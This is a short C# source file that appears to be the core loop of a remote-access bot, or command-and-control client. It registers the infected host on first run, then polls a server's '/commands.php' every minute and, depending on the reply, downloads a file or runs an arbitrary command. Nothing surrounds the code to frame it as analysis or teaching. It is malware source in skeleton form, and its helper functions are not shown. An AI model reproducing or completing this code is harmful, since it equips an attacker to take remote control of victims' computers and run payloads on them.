namespace RemoteControl
{
    class Program
    {

        static void c2c()
        {
            string resp = workers.request("/commands.php");
            string[] command = resp.Split(',');

            switch (command[0])
            {
                case "dae":
                    workers.download(command[1]);
                    break;

                case "cmd":
                    workers.cmd(command[1]);
                    break;

                default:
                    break;
            }
        }
  
        static void Main(string[] args)
        {
            if (helpers.first_run())
            {
                workers.first_seen();
            }

            while (true)
            {
                c2c();
                System.Threading.Thread.Sleep(60000);
            }
        }
    }
}
